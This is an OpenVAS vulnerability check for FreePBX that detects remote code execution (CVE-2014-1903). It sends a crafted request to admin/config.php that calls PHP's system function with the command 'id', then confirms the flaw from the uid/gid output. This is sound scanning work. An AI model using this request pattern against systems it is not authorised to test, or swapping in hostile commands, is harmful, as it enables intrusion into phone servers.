###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freepbx_65509.nasl 6756 2017-07-18 13:31:14Z cfischer $
#
# FreePBX 'admin/config.php' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103920";
CPE = "cpe:/a:freepbx:freepbx";

tag_insight = "admin/libraries/view.functions.php does not restrict
the set of functions accessible to the API handler, which allows
remote attackers to execute arbitrary PHP code via the function and
args parameters to admin/config.php.";

tag_impact = "Successfully exploiting this issue will allow attackers to execute
arbitrary code in the context of the affected application. Failed
exploit attempts may result in a denial-of-service condition.";

tag_affected = "FreePBX versions 2.9, 2.10, 2.11, and 12 are vulnerable.";
tag_summary = "FreePBX is prone to a remote code-execution vulnerability.";

tag_solution = "Updates are available.";
tag_vuldetect = "Try to execute a command with a sprecial crafted HTTP GET request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(65509);
 script_cve_id("CVE-2014-1903");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6756 $");
 script_name("FreePBX 'admin/config.php' Remote Code Execution Vulnerability");

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65509");
 script_xref(name:"URL", value:"http://freepbx.org");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-03-14 11:41:40 +0100 (Fri, 14 Mar 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("gb_freepbx_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("freepbx/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, nvt:SCRIPT_OID ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, nvt:SCRIPT_OID, port:port ) ) exit( 0 );
url = dir + '/admin/config.php?display=OpenVAS&handler=api&file=OpenVAS&module=OpenVAS&function=system&args=id';

if( buf = http_vuln_check( port:port, url:url, pattern:'uid=[0-9]+.*gid=[0-9]+' ) )
{
  report = 'By requesting the url "' + url + '"\nscanner received the following response:\n\n' + buf + '\n';

  security_message(port:port, data:report);
  exit( 0 );
}  

exit( 99 );

